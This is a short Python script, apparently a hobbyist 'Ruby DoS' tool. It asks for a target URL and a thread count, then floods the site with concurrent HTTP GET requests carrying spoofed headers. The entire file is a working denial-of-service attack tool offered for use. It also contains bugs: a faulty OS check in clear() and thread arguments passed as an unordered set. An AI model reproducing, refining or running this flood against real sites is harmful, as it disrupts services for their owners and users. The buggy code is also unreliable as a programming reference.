import os
import aiohttp
import asyncio
from datetime import datetime
from colorama import Fore
from utils.headers import initHeaders
import threading

def clear():
    if os.system('nt'):
        os.system("cls")
    else:
        os.system("clear")

def timewrap(function):
    def wrapper(*args):

        start = datetime.now()
        function(*args)
        end = datetime.now()

        print(Fore.YELLOW + "Thread has been closed | Time: " + str(end-start) + Fore.RESET)
    return wrapper

async def make_request(url: str):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers=initHeaders()):
                print(Fore.GREEN + "Request for url " + url + " is completed" + Fore.RESET)
        except:
            print(Fore.RED + "Request for url " + url + " is not done" + Fore.RESET)


async def main(url: str, amount_of_requests: int):
    tasks = []
    try:
        for i in range(amount_of_requests):
            tasks.append(asyncio.create_task(make_request(url)))
    except Exception as ex:
        print("Something went wrong")
        print(ex)
    await asyncio.gather(*tasks)

@timewrap
def start_thread(url: str, amount_of_requests: int):
    asyncio.run(main(url, amount_of_requests))

if __name__ == '__main__':
    clear()
    print('''

    /\\
   /  \\
  /    \\
 /      \\
/        \\
\        /
 \      /
  \    /
   \  /
    \/
    \n''')
    print("Ruby DoS\n")
    url = input("Enter url for DoS attack: ")
    threads = int(input("Enter amount of threads: "))
    amount_of_requests = int(input("Enter amount of requests per thread: "))
    for t in range(threads):
        thread = threading.Thread(target=start_thread, name=f'thread{t}', args= {url, amount_of_requests})
        thread.start()
        thread.join(50)

